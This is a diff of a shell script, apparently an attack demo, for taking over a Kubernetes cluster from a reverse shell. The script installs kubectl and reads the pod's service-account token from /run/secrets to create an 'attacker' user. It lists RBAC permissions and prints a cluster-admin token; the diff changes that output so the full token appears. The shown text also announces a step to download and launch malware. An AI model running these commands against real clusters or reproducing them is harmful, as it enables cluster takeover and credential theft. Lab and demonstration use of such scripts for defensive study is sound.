@@ -2,6 +2,7 @@
 # Instalk kubectl script
 # Christopher Ley 
 
+
 # install kubectl
 if [ ! -f "/usr/local/bin/kubectl" ]; then
 	apt update && apt -y install curl
@@ -14,6 +15,9 @@ fi
 # execute command to take control of kubernetes cluster
 # work in /tmp
 cd /tmp
+
+# Lists all Kubernetes actions the current user or service account is authorized to perform (RBAC permissions).
+kubectl auth can-i --list
 
 # create new user from reverse-shell and using kubectl with kubernetes token
 kubectl config set-credentials attacker --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
@@ -65,8 +69,8 @@ echo "Kubernetes Dashboard URL is: https://${k8surl}"
 kubectl get svc kubernetes-dashboard -n kubernetes-dashboard --token=$(cat /tmp/token) 
 
 # Echo ClusterAdmin Token (remove ey to print output on GitHub action)
-echo "Cluster Admin Token is (add ey at the beginning of the output): "
-cat /tmp/token | cut -c 3-
+echo "Cluster Admin Token is: "
+cat /tmp/token 
 
 # Download sample malware
 echo "Download & launch malware"
